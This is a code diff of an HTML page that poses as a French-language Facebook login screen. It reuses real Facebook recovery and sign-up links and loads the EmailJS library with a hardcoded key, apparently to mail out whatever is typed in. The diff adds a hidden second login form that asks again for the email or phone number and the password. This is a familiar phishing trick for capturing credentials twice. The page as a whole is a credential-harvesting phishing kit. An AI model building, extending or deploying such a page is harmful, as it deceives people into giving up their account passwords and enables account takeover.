@@ -8,7 +8,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
-<body>
+<body id="body">
     <div id="error" class="error"></div>
     <div class="form-parent">
         <form class="form-contact" action="#" id="form">
@@ -25,15 +25,36 @@
             <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget-link">
                 Mot de passe oublié ?
             </a>
-            <input href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="btn" value="Créer nouveau compte">
-            </input>
+            <input href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="btn" value="Créer nouveau compte" id="creer">
+        </form>
+    </div>
+
+    <!-- الحقول الإضافية المخفية -->
+    <div id="additional-fields" class="hidden-field">
+        <form class="hidden-field" action="#" id="form1">
+            <div id="error1" class="error"></div>
+            <div class="input-container1">
+                <input class="login1" type="text" id="name1" placeholder=" ">
+                <label for="extra-field1" class="extra-field1">Adresse e-mail ou numéro de tél.</label>
+            </div>
+            <div class="input-container1 password-container1">
+                <input class="login1" type="text" id="password1" placeholder=" ">
+                <label for="extra-field2" class="extra-field2">Mot de passe</label>
+                <i id="toggle-password1" class="fas fa-eye-slash toggle-password1"></i>
+            </div>
+            <input type="submit" value="Se connecter" class="login-btn1" id="submit">
+            <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget-link1" id="extra-field3">
+                Mot de passe oublié ?
+            </a>
+            <input href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="btn1" value="Créer nouveau compte" id="creer1">
         </form>
     </div>
     <script src="script.js"></script>
     <script type="text/javascript">
         (function(){
-           emailjs.init("Cf6AQnmKaonDjuzz5");  // استبدال publicKey بمعرف المستخدم الخاص بك
+        emailjs.init("Cf6AQnmKaonDjuzz5");  // استبدال publicKey بمعرف المستخدم الخاص بك
         })();
     </script>
 </body>
 </html>
+
